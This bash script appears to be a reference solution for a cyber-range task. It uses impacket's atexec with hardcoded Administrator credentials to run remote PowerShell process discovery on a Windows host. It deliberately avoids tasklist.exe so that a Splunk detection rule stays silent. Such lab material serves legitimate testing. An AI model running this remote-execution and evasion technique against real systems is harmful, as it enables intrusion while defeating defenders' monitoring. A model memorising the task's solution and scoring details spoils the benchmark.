#!/bin/bash
# Reference for quiet-discovery-t1057, run on the attack box: enumerate the
# endpoint's processes (T1057) WITHOUT launching the native tasklist binary,
# so the stealth detection goal sees no OriginalFileName=tasklist.exe process
# create and the enumerator-budget evade count stays at 0. The enumeration is
# PowerShell's Get-Process (in-process, native APIs): the discovery provably
# runs (the output must carry lsass, the execution-evidence rule), its own
# telemetry (the atexec cmd/powershell process creates) keeps the window
# provably FLOWING (a stealth verdict needs flow, and the background activity
# cadence is 10 minutes, longer than the 180 s window), and nothing it spawns
# carries the hunted original filename. No separation sleep: the preceding
# trio (execute-and-confirm) never launches tasklist, so its in-window
# telemetry cannot match either goal in either direction. Detection and evade
# goals take no submissions; must score 1.0 valid.
set -euo pipefail

WIN=10.0.2.11
SPLUNK=10.0.2.10

deadline=$(( $(date +%s) + 600 ))
until nc -z -w3 "$WIN" 445 && nc -z -w3 "$SPLUNK" 9997; do
  [ "$(date +%s)" -lt "$deadline" ] || { echo "the surfaces never converged" >&2; exit 1; }
  sleep 10
done

echo "step: process discovery without the native enumerator (Get-Process)" >&2
enum_out=$(timeout 180 atexec.py 'Administrator:changeme123!@'"$WIN" \
  'powershell -NoProfile -Command "Get-Process | Select-Object -ExpandProperty ProcessName | Sort-Object -Unique"' 2>&1 || true)
# execution evidence, not exit codes (impacket exits 0 on handled errors): the
# enumeration must PROVABLY run or the quiet window was never earned; lsass is
# always resident, so its absence means the discovery did not happen
grep -qiE '^lsass[[:space:]]*$' <<<"$enum_out" \
  || { echo "the process discovery never ran" >&2; tail -5 <<<"$enum_out" >&2; exit 1; }
echo "discovery ran ($(grep -c '^[A-Za-z]' <<<"$enum_out" || true) name lines)" >&2

# the pipeline settle: the quiet verdict needs a complete, flowing window, so
# this check's own benign telemetry (the atexec process creates) must finish
# shipping before scoring reads the stream
echo "step: telemetry settle" >&2
sleep 45
echo "T1057 done without tasklist; both goals must read a quiet, flowing window" >&2
